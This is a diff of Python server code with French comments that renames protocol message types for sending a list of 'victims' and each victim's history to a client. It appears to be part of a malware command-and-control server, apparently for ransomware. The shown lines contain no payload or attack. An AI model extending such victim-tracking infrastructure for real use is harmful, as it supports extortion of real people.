@@ -50,13 +50,13 @@ def main():
             for i in range(len(victims)):
                 victime = victims[i]
                 # Envoi de la réponse de type LIST_VICTIM_RESP
-                message_response = message.set_message("LIST_VICTIM_RESP", victime)
+                message_response = message.set_message("LIST_RESP", victime)
                 print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                 network.send_message(client_socket, message_response)
                 print("Message envoyé")
                 # Envoi de la réponse de type LIST_VICTIM_END
                 if i == len(victims)-1:
-                    message_response = message.set_message("LIST_VICTIM_END")
+                    message_response = message.set_message("LIST_END")
                     print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                     network.send_message(client_socket, message_response)
                     print("Message envoyé")
@@ -70,13 +70,13 @@ def main():
             history = data.get_list_history(conn, victim_id)
             # Envoi de la réponse de type HISTORY_RESP (pour chaque élément de l'historique)
             for i in range(len(history)):
-                message_response = message.set_message("HISTORY_RESP", history[i])
+                message_response = message.set_message("HIST_RESP", history[i])
                 print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                 network.send_message(client_socket, message_response)
                 print("Message envoyé")
                 # Envoi de la réponse de type HISTORY_END
                 if i == len(history)-1:
-                    message_response = message.set_message("HISTORY_END")
+                    message_response = message.set_message("HIST_END")
                     print(f"Envoi d'un message de type {message.get_message_type(message_response)}")
                     network.send_message(client_socket, message_response)
                     print("Message envoyé")
